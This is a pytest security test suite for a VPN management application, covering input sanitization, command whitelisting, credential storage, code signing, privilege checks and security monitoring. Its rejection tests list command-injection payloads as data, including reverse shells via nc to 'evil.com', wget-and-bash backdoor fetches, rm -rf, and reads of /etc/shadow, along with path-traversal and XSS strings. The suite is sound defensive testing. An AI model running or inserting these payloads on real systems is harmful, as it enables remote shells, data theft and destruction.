"""
Comprehensive Security Test Suite
Validates all security fixes and input sanitization measures
"""

import pytest
import asyncio
from unittest.mock import patch, MagicMock
import tempfile
import os
import sys
import time
from pathlib import Path

# Add src directory to path for imports
src_dir = Path(__file__).parent.parent / "src"
sys.path.insert(0, str(src_dir))

from security.input_sanitizer import InputSanitizer, SecurityException
from security.secure_command_executor import SecureCommandExecutor
from security.code_signing import CodeSigningManager
from security.network_security import NetworkSecurityManager
from security.privilege_manager import PrivilegeManager, PrivilegeLevel
from security.security_monitor import SecurityMonitor, SecurityEventType, SecuritySeverity
from core.config_manager import ConfigurationManager


class TestInputSanitizer:
    """Test suite for input sanitization"""
    
    def test_username_injection_prevention(self):
        """Test prevention of command injection in usernames"""
        malicious_inputs = [
            "user; rm -rf /",
            "user && wget evil.com/script.sh",
            "user`whoami`",
            "user$(id)",
            "user|cat /etc/passwd",
            "user\nrm -rf /",
            "user\r\nwget evil.com",
            "user\t& whoami",
            "user\\\\; echo hacked",
            "user & ping evil.com",
            "user > /etc/passwd",
            "user < /dev/null; rm -rf /",
            "user$USER",
            "user`curl evil.com`",
            "admin'; DROP TABLE users; --"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityException) as exc_info:
                InputSanitizer.sanitize_username(malicious_input)
            assert "prohibited character" in str(exc_info.value) or "suspicious patterns" in str(exc_info.value)
    
    def test_password_injection_prevention(self):
        """Test prevention of command injection in passwords"""
        malicious_passwords = [
            "pass; echo 'hacked'",
            "pass && curl hacker.com",
            "pass`ls -la`",
            "pass$USER",
            "pass|nc -e /bin/sh evil.com 4444",
            "pass\n$(wget evil.com/backdoor.sh)",
            "pass\r& rm -rf /",
            "pass\t|| cat /etc/shadow",
            "pass\\; ping evil.com",
            "pass > /tmp/hacked",
            "pass < /dev/urandom; reboot"
        ]
        
        for malicious_password in malicious_passwords:
            with pytest.raises(SecurityException) as exc_info:
                InputSanitizer.sanitize_password(malicious_password)
            assert "prohibited character" in str(exc_info.value) or "suspicious patterns" in str(exc_info.value)
    
    def test_server_name_injection_prevention(self):
        """Test prevention of command injection in server names"""
        malicious_servers = [
            "server; shutdown -h now",
            "server.com && rm -rf /",
            "server`whoami`.com",
            "server$(uname -a).com",
            "server|evil.com",
            "../../etc/passwd",
            "../../../windows/system32/cmd.exe",
            "server\nrm -rf /",
            "server.com & wget evil.com"
        ]
        
        for malicious_server in malicious_servers:
            with pytest.raises(SecurityException) as exc_info:
                InputSanitizer.sanitize_server_name(malicious_server)
    
    def test_valid_inputs_pass(self):
        """Test that valid inputs are accepted"""
        valid_usernames = [
            "john.doe",
            "user123",
            "test_user",
            "admin@company.com",
            "user-name"
        ]
        
        valid_passwords = [
            "SecurePassword123!",
            "P@ssw0rd",
            "MyVerySecurePassword2024",
            "test123"
        ]
        
        valid_servers = [
            "us-east-1.nordvpn.com",
            "server123",
            "uk.expressvpn.com",
            "germany.surfshark.com"
        ]
        
        for username in valid_usernames:
            result = InputSanitizer.sanitize_username(username)
            assert result == username
        
        for password in valid_passwords:
            result = InputSanitizer.sanitize_password(password)
            assert result == password
        
        for server in valid_servers:
            result = InputSanitizer.sanitize_server_name(server)
            assert result == server
    
    def test_input_length_limits(self):
        """Test input length validation"""
        # Test username length limits
        long_username = "a" * (InputSanitizer.MAX_USERNAME_LENGTH + 1)
        with pytest.raises(SecurityException, match="Username too long"):
            InputSanitizer.sanitize_username(long_username)
        
        # Test password length limits
        long_password = "a" * (InputSanitizer.MAX_PASSWORD_LENGTH + 1)
        with pytest.raises(SecurityException, match="Password too long"):
            InputSanitizer.sanitize_password(long_password)
        
        # Test server name length limits
        long_server = "a" * (InputSanitizer.MAX_SERVER_NAME_LENGTH + 1)
        with pytest.raises(SecurityException, match="Server name too long"):
            InputSanitizer.sanitize_server_name(long_server)
    
    def test_empty_inputs(self):
        """Test handling of empty inputs"""
        with pytest.raises(SecurityException, match="cannot be empty"):
            InputSanitizer.sanitize_username("")
        
        with pytest.raises(SecurityException, match="cannot be empty"):
            InputSanitizer.sanitize_password("")
        
        with pytest.raises(SecurityException, match="cannot be empty"):
            InputSanitizer.sanitize_server_name("")
    
    def test_ip_address_validation(self):
        """Test IP address validation"""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "127.0.0.1"
        ]
        
        invalid_ips = [
            "256.256.256.256",
            "192.168.1",
            "192.168.1.1.1",
            "not.an.ip.address",
            "192.168.1.1; rm -rf /",
            "192.168.1.1`whoami`"
        ]
        
        for valid_ip in valid_ips:
            result = InputSanitizer.sanitize_ip_address(valid_ip)
            assert result == valid_ip
        
        for invalid_ip in invalid_ips:
            with pytest.raises(SecurityException):
                InputSanitizer.sanitize_ip_address(invalid_ip)
    
    def test_port_validation(self):
        """Test port number validation"""
        valid_ports = ["80", "443", "1194", "8080", "65535"]
        invalid_ports = ["0", "65536", "port", "80; rm -rf /", "-1"]
        
        for valid_port in valid_ports:
            result = InputSanitizer.sanitize_port(valid_port)
            assert isinstance(result, int)
            assert 1 <= result <= 65535
        
        for invalid_port in invalid_ports:
            with pytest.raises(SecurityException):
                InputSanitizer.sanitize_port(invalid_port)


class TestSecureCommandExecutor:
    """Test suite for secure command execution"""
    
    @pytest.mark.asyncio
    async def test_command_whitelist_enforcement(self):
        """Test that only whitelisted commands are allowed"""
        executor = SecureCommandExecutor()
        
        # Test allowed commands
        allowed_commands = [
            ["nordvpn", "status"],
            ["expressvpn", "list"],
            ["surfshark-vpn", "status"]
        ]
        
        # Mock the actual execution to avoid real VPN commands
        with patch.object(executor, '_execute_subprocess') as mock_exec:
            mock_exec.return_value = (0, "success", "")
            
            for command in allowed_commands:
                try:
                    await executor.execute_vpn_command(command)
                except SecurityException:
                    pytest.fail(f"Allowed command {command} was rejected")
    
    @pytest.mark.asyncio
    async def test_command_blacklist_enforcement(self):
        """Test that dangerous commands are blocked"""
        executor = SecureCommandExecutor()
        
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["wget", "evil.com/script.sh"],
            ["curl", "hacker.com"],
            ["nc", "-e", "/bin/sh", "evil.com", "4444"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["format", "C:"],
            ["shutdown", "-h", "now"],
            ["reboot"],
            ["sudo", "rm", "-rf", "/"],
            ["cmd", "/c", "del", "C:\\*.*"],
            ["powershell", "-Command", "Remove-Item", "-Path", "C:\\", "-Recurse"]
        ]
        
        for command in dangerous_commands:
            with pytest.raises(SecurityException):
                await executor.execute_vpn_command(command)
    
    @pytest.mark.asyncio
    async def test_credential_injection_prevention(self):
        """Test prevention of credential injection"""
        executor = SecureCommandExecutor()
        
        malicious_credentials = {
            "username": "user; rm -rf /",
            "password": "pass && wget evil.com"
        }
        
        with pytest.raises(SecurityException):
            await executor.execute_vpn_auth("nordvpn", 
                                           malicious_credentials["username"], 
                                           malicious_credentials["password"])
    
    @pytest.mark.asyncio
    async def test_timeout_enforcement(self):
        """Test that command timeout is enforced"""
        executor = SecureCommandExecutor()
        
        with patch.object(executor, '_execute_subprocess') as mock_exec:
            # Simulate timeout
            mock_exec.side_effect = asyncio.TimeoutError()
            
            with pytest.raises(SecurityException, match="timed out"):
                await executor.execute_vpn_command(["nordvpn", "status"], timeout=1)


class TestConfigurationManagerSecurity:
    """Test suite for secure credential storage"""
    
    def setup_method(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.config_manager = ConfigurationManager(self.temp_dir)
    
    def teardown_method(self):
        """Cleanup test environment"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_credential_validation_on_storage(self):
        """Test that credentials are validated before storage"""
        malicious_provider = "provider; rm -rf /"
        malicious_username = "user`whoami`"
        malicious_password = "pass && curl evil.com"
        
        # These should all fail validation
        assert not self.config_manager.store_provider_credentials(
            malicious_provider, "validuser", "validpass"
        )
        
        assert not self.config_manager.store_provider_credentials(
            "validprovider", malicious_username, "validpass"
        )
        
        assert not self.config_manager.store_provider_credentials(
            "validprovider", "validuser", malicious_password
        )
    
    def test_secure_credential_storage(self):
        """Test that valid credentials are stored securely"""
        provider = "nordvpn"
        username = "testuser"
        password = "SecurePassword123!"
        
        # Store credentials
        result = self.config_manager.store_provider_credentials(provider, username, password)
        assert result is True
        
        # Retrieve credentials
        retrieved = self.config_manager.retrieve_provider_credentials(provider)
        assert retrieved is not None
        assert retrieved["username"] == username
        assert retrieved["password"] == password
    
    def test_credential_deletion(self):
        """Test secure credential deletion"""
        provider = "expressvpn"
        username = "testuser2"
        password = "AnotherSecurePass!"
        
        # Store and then delete
        self.config_manager.store_provider_credentials(provider, username, password)
        deletion_result = self.config_manager.delete_provider_credentials(provider)
        assert deletion_result is True
        
        # Verify deletion
        retrieved = self.config_manager.retrieve_provider_credentials(provider)
        assert retrieved is None


class TestVPNProviderSecurity:
    """Test suite for VPN provider security enhancements"""
    
    @pytest.mark.asyncio
    async def test_provider_authentication_security(self):
        """Test that provider authentication validates inputs"""
        # This would need to be tested with actual provider implementations
        # For now, we test that the secure executor is being used
        
        from providers.nordvpn import NordVPNProvider
        
        provider = NordVPNProvider({})
        
        # Test with malicious inputs
        malicious_username = "user; rm -rf /"
        malicious_password = "pass`whoami`"
        
        # This should fail due to input validation
        with patch.object(provider.secure_executor, 'execute_vpn_auth') as mock_auth:
            mock_auth.side_effect = SecurityException("Invalid input")
            
            result = await provider.authenticate(malicious_username, malicious_password)
            assert result is False


class TestSecurityIntegration:
    """Integration tests for overall security"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security_validation(self):
        """Test complete security validation flow"""
        # Test that malicious input is caught at multiple layers
        
        malicious_username = "user; wget evil.com/backdoor.sh | bash"
        malicious_password = "pass && rm -rf /"
        
        # Should fail at input sanitizer level
        with pytest.raises(SecurityException):
            InputSanitizer.sanitize_username(malicious_username)
        
        with pytest.raises(SecurityException):
            InputSanitizer.sanitize_password(malicious_password)
        
        # Should fail at command executor level
        executor = SecureCommandExecutor()
        with pytest.raises(SecurityException):
            await executor.execute_vpn_auth("nordvpn", malicious_username, malicious_password)
        
        # Should fail at config manager level
        config_manager = ConfigurationManager(tempfile.mkdtemp())
        result = config_manager.store_provider_credentials("nordvpn", malicious_username, malicious_password)
        assert result is False
    
    def test_security_logging_no_credential_exposure(self):
        """Test that security logs don't expose credentials"""
        # Test that hashing works properly for logging
        sensitive_data = "SecretPassword123!"
        hashed = InputSanitizer.hash_sensitive_data(sensitive_data)
        
        # Hash should be consistent
        assert InputSanitizer.hash_sensitive_data(sensitive_data) == hashed
        
        # Hash should not reveal original data
        assert sensitive_data not in hashed
        assert len(hashed) == 16  # Truncated hash length
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../config/../../sensitive.conf"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityException):
                InputSanitizer.sanitize_file_path(malicious_path)


def run_security_tests():
    """Run all security tests"""
    print("Running comprehensive security test suite...")
    
    # Run tests with pytest
    test_result = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--disable-warnings"
    ])
    
    if test_result == 0:
        print("✅ All security tests PASSED! Your VPN Hub is secure.")
    else:
        print("❌ Some security tests FAILED! Please review and fix issues.")
    
    return test_result


class TestCodeSigning:
    """Test suite for code signing and integrity verification"""
    
    def setup_method(self):
        """Setup for each test"""
        self.temp_dir = tempfile.mkdtemp()
        self.signer = CodeSigningManager(self.temp_dir)
        
    def teardown_method(self):
        """Cleanup after each test"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        
    def test_key_generation(self):
        """Test RSA key pair generation"""
        assert self.signer.private_key_path.exists()
        assert self.signer.public_key_path.exists()
        
        # Verify keys are valid
        private_key = self.signer._load_private_key()
        public_key = self.signer._load_public_key()
        
        assert private_key is not None
        assert public_key is not None
        
    def test_file_signing(self):
        """Test file signing functionality"""
        # Create test file
        test_file = Path(self.temp_dir) / "test.py"
        test_file.write_text("print('Hello, World!')")
        
        # Sign file
        signature_info = self.signer.sign_file(test_file)
        
        assert signature_info['file_path'] == str(test_file.absolute())
        assert 'file_hash' in signature_info
        assert 'signature' in signature_info
        assert 'timestamp' in signature_info
        
    def test_file_verification(self):
        """Test file verification"""
        # Create and sign test file
        test_file = Path(self.temp_dir) / "test.py"
        test_file.write_text("print('Hello, World!')")
        
        self.signer.sign_file(test_file)
        
        # Verify file
        assert self.signer.verify_file(test_file) == True
        
        # Modify file and verify again
        test_file.write_text("print('Modified!')")
        assert self.signer.verify_file(test_file) == False
        
    def test_integrity_report(self):
        """Test integrity report generation"""
        # Create test files
        for i in range(3):
            test_file = Path(self.temp_dir) / f"test{i}.py"
            test_file.write_text(f"print('Test {i}')")
            
        # Sign some files
        test_files = list(Path(self.temp_dir).glob("*.py"))
        for test_file in test_files[:2]:
            self.signer.sign_file(test_file)
            
        # Generate report
        report = self.signer.get_file_integrity_report(self.temp_dir)
        
        assert report['total_python_files'] == 3
        assert report['valid_signatures'] == 2
        assert report['unsigned_files'] == 1
        assert report['integrity_score'] > 50


class TestNetworkSecurity:
    """Test suite for network security features"""
    
    def setup_method(self):
        """Setup for each test"""
        self.network_security = NetworkSecurityManager()
        
    def test_url_validation(self):
        """Test URL validation"""
        # Valid URLs
        valid_urls = [
            "https://api.nordvpn.com/login",
            "https://expressvpn.com/api/auth",
            "https://surfshark.com/api/connect"
        ]
        
        for url in valid_urls:
            assert self.network_security.validate_url(url) == True
            
        # Invalid URLs
        invalid_urls = [
            "http://insecure.com",  # HTTP not HTTPS
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "https://evil.com/../../../etc/passwd",
            "https://site.com<script>alert(1)</script>"
        ]
        
        for url in invalid_urls:
            assert self.network_security.validate_url(url) == False
            
    def test_secure_dns_lookup(self):
        """Test secure DNS resolution"""
        # Test with valid hostname
        results = self.network_security.secure_dns_lookup("google.com")
        assert isinstance(results, list)
        
        # Test with invalid hostname
        results = self.network_security.secure_dns_lookup("nonexistent-domain-12345.com")
        assert results == []
        
    def test_security_headers(self):
        """Test security headers generation"""
        headers = self.network_security.get_security_headers()
        
        required_headers = [
            'Strict-Transport-Security',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection'
        ]
        
        for header in required_headers:
            assert header in headers
            
    @patch('requests.Session.request')
    def test_secure_request(self, mock_request):
        """Test secure HTTP request functionality"""
        # Mock successful response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_request.return_value = mock_response
        
        # Test secure request
        response = self.network_security.make_secure_request(
            'GET', 
            'https://api.example.com/test'
        )
        
        assert response.status_code == 200
        mock_request.assert_called_once()


class TestPrivilegeManager:
    """Test suite for privilege management"""
    
    def setup_method(self):
        """Setup for each test"""
        self.privilege_manager = PrivilegeManager()
        
    def test_privilege_detection(self):
        """Test current privilege level detection"""
        privilege_level = self.privilege_manager.get_current_privilege_level()
        assert isinstance(privilege_level, PrivilegeLevel)
        
    def test_elevation_requirement_check(self):
        """Test privilege elevation requirement checking"""
        # Operations requiring elevation
        elevated_operations = [
            'network_config',
            'service_management',
            'firewall_config'
        ]
        
        for operation in elevated_operations:
            # Most operations should require elevation for regular users
            requires_elevation = self.privilege_manager.requires_elevation(operation)
            assert isinstance(requires_elevation, bool)
            
    def test_escalation_attempt_tracking(self):
        """Test privilege escalation attempt tracking"""
        initial_attempts = len(self.privilege_manager.escalation_attempts)
        
        # Simulate escalation attempt (this should be tracked)
        can_escalate = self.privilege_manager.can_escalate_privileges()
        assert isinstance(can_escalate, bool)
        
    def test_privilege_report(self):
        """Test privilege status reporting"""
        report = self.privilege_manager.get_privilege_report()
        
        required_fields = [
            'current_privilege_level',
            'is_elevated',
            'escalation_attempts_count',
            'can_escalate',
            'platform'
        ]
        
        for field in required_fields:
            assert field in report
            
    @patch('subprocess.run')
    def test_command_execution_with_privileges(self, mock_subprocess):
        """Test command execution with privilege checking"""
        # Mock successful command execution
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Success"
        mock_result.stderr = ""
        mock_subprocess.return_value = mock_result
        
        # Test command execution (should work without elevation for basic commands)
        try:
            result = self.privilege_manager._execute_command(['echo', 'test'])
            assert result[0] == 0  # Return code
            assert result[1] == "Success"  # Stdout
        except SecurityException:
            # This is acceptable if the command is blocked for security
            pass


class TestSecurityMonitor:
    """Test suite for security monitoring and auditing"""
    
    def setup_method(self):
        """Setup for each test"""
        self.temp_dir = tempfile.mkdtemp()
        self.security_monitor = SecurityMonitor(self.temp_dir)
        
    def teardown_method(self):
        """Cleanup after each test"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        
    def test_security_event_logging(self):
        """Test security event logging"""
        # Log a test event
        self.security_monitor.log_security_event(
            SecurityEventType.AUTHENTICATION_SUCCESS,
            SecuritySeverity.LOW,
            'test_source',
            'Test security event',
            {'test_detail': 'test_value'},
            'test_user'
        )
        
        # Check that event was logged
        assert self.security_monitor.security_log_file.exists()
        
        # Verify metrics were updated
        assert self.security_monitor.metrics['events_by_type']['auth_success'] == 1
        
    def test_authentication_tracking(self):
        """Test authentication attempt tracking"""
        username = "test_user"
        provider = "nordvpn"
        
        # Log successful authentication
        self.security_monitor.log_authentication_attempt(
            username, provider, True, "192.168.1.1"
        )
        
        # Log failed authentication
        self.security_monitor.log_authentication_attempt(
            username, provider, False, "192.168.1.1"
        )
        
        # Check metrics
        assert self.security_monitor.metrics['authentication_stats']['successful_attempts'] == 1
        assert self.security_monitor.metrics['authentication_stats']['failed_attempts'] == 1
        
    def test_brute_force_detection(self):
        """Test brute force attack detection"""
        username = "test_user"
        provider = "nordvpn"
        ip_address = "192.168.1.100"
        
        # Simulate multiple failed authentication attempts
        for i in range(6):  # Exceed threshold
            self.security_monitor.log_authentication_attempt(
                username, provider, False, ip_address
            )
            
        # Check if user is blocked
        assert username in self.security_monitor.auth_tracker['blocked_users']
        
    def test_command_execution_logging(self):
        """Test command execution logging"""
        command = ['echo', 'test']
        user_context = 'test_user'
        
        # Log command execution
        self.security_monitor.log_command_execution(
            command, user_context, True, 'test output'
        )
        
        # Verify logging
        assert len(self.security_monitor.command_frequencies[user_context]) == 1
        
    def test_privilege_escalation_logging(self):
        """Test privilege escalation logging"""
        operation = 'network_config'
        user_context = 'test_user'
        reason = 'Configure VPN DNS'
        
        # Log privilege escalation
        self.security_monitor.log_privilege_escalation(
            operation, user_context, True, reason
        )
        
        # Verify logging
        assert len(self.security_monitor.privilege_escalations[user_context]) == 1
        
    def test_network_activity_logging(self):
        """Test network activity logging"""
        url = 'https://api.nordvpn.com/login'
        method = 'POST'
        status_code = 200
        user_context = 'test_user'
        
        # Log network activity
        self.security_monitor.log_network_activity(
            url, method, status_code, user_context
        )
        
        # Verify logging
        assert len(self.security_monitor.network_requests[user_context]) == 1
        
    def test_security_report_generation(self):
        """Test security report generation"""
        # Generate some test events
        self.security_monitor.log_security_event(
            SecurityEventType.AUTHENTICATION_SUCCESS,
            SecuritySeverity.LOW,
            'test_source',
            'Test event 1'
        )
        
        self.security_monitor.log_security_event(
            SecurityEventType.AUTHENTICATION_FAILURE,
            SecuritySeverity.MEDIUM,
            'test_source',
            'Test event 2'
        )
        
        # Generate report
        report = self.security_monitor.get_security_report(hours=1)
        
        # Verify report structure
        required_fields = [
            'report_period_hours',
            'total_events',
            'events_by_type',
            'events_by_severity',
            'authentication_summary'
        ]
        
        for field in required_fields:
            assert field in report
            
        assert report['total_events'] >= 2
        
    def test_anomaly_detection(self):
        """Test anomaly detection functionality"""
        user = 'test_user'
        
        # Generate high frequency of commands to trigger anomaly
        for i in range(15):  # Exceed threshold
            self.security_monitor.command_frequencies[user].append(time.time())
            
        # Trigger anomaly check
        self.security_monitor._check_command_frequency_anomalies(time.time())
        
        # Should have logged an anomaly
        assert self.security_monitor.metrics['events_by_type'].get('suspicious_activity', 0) > 0


class TestSecurityIntegrationAdvanced:
    """Advanced integration tests for all security features"""
    
    def setup_method(self):
        """Setup for integration tests"""
        self.temp_dir = tempfile.mkdtemp()
        
        # Initialize all security components
        self.code_signing = CodeSigningManager(self.temp_dir)
        self.network_security = NetworkSecurityManager()
        self.privilege_manager = PrivilegeManager()
        self.security_monitor = SecurityMonitor(self.temp_dir)
        
    def teardown_method(self):
        """Cleanup after tests"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        
    def test_end_to_end_security_workflow(self):
        """Test complete security workflow"""
        # 1. Create and sign a Python file
        test_file = Path(self.temp_dir) / "secure_module.py"
        test_file.write_text("def secure_function(): return 'secure'")
        
        signature_info = self.code_signing.sign_file(test_file)
        assert 'signature' in signature_info
        
        # 2. Verify file integrity
        assert self.code_signing.verify_file(test_file) == True
        
        # 3. Log security events
        self.security_monitor.log_security_event(
            SecurityEventType.FILE_INTEGRITY_VIOLATION,
            SecuritySeverity.HIGH,
            'integrity_checker',
            f'File integrity verified: {test_file}',
            signature_info
        )
        
        # 4. Check privilege requirements for file operations
        requires_elevation = self.privilege_manager.requires_elevation('system_config')
        assert isinstance(requires_elevation, bool)
        
        # 5. Validate network security for hypothetical API call
        test_url = 'https://api.nordvpn.com/test'
        assert self.network_security.validate_url(test_url) == True
        
    def test_security_violation_response(self):
        """Test response to security violations"""
        # Simulate file tampering
        test_file = Path(self.temp_dir) / "important.py"
        test_file.write_text("original_content = True")
        
        # Sign original file
        self.code_signing.sign_file(test_file)
        assert self.code_signing.verify_file(test_file) == True
        
        # Tamper with file
        test_file.write_text("malicious_content = True")
        
        # Verify tampering is detected
        assert self.code_signing.verify_file(test_file) == False
        
        # Log security violation
        self.security_monitor.log_security_event(
            SecurityEventType.FILE_INTEGRITY_VIOLATION,
            SecuritySeverity.CRITICAL,
            'integrity_monitor',
            f'File tampering detected: {test_file}',
            {'original_hash': 'abc123', 'current_hash': 'def456'}
        )
        
        # Verify critical event was logged
        assert self.security_monitor.metrics['events_by_severity'][SecuritySeverity.CRITICAL.value] == 1
        
    def test_comprehensive_security_audit(self):
        """Test comprehensive security audit"""
        # Generate various security events
        events = [
            (SecurityEventType.AUTHENTICATION_SUCCESS, SecuritySeverity.LOW, 'User login successful'),
            (SecurityEventType.PRIVILEGE_ESCALATION, SecuritySeverity.HIGH, 'Admin privileges granted'),
            (SecurityEventType.NETWORK_ANOMALY, SecuritySeverity.MEDIUM, 'Suspicious network traffic'),
            (SecurityEventType.COMMAND_INJECTION_ATTEMPT, SecuritySeverity.CRITICAL, 'Command injection blocked')
        ]
        
        for event_type, severity, message in events:
            self.security_monitor.log_security_event(
                event_type, severity, 'security_audit', message
            )
            
        # Generate security report
        report = self.security_monitor.get_security_report(hours=1)
        
        # Verify audit results
        assert report['total_events'] == len(events)
        assert len(report['events_by_type']) > 0
        assert len(report['events_by_severity']) > 0
        
        # Check for critical events
        assert len(report['critical_events']) >= 1


if __name__ == "__main__":
    run_security_tests()